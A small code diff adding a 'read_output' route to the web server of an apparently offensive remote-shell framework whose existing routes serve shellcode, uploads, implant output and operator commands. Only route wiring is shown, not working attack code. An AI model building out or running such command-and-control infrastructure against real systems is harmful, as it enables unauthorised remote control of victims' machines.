@@ -53,6 +53,7 @@ pub async fn server(i: &str, cert_path: &str, tls_key: &str) -> std::io::Result<
                 "/rs-shell/shellcode{shellcode:.*}",
                 web::get().to(shellcode),
             )
+            .route("/rs-shell/read_output", web::get().to(read_output))
             .route("/rs-shell/upload{filename:.*}", web::get().to(upload))
             .route("/rs-shell/output_imp", web::post().to(output_imp))
             .route("/rs-shell/operator_cmd", web::post().to(operator_cmd))
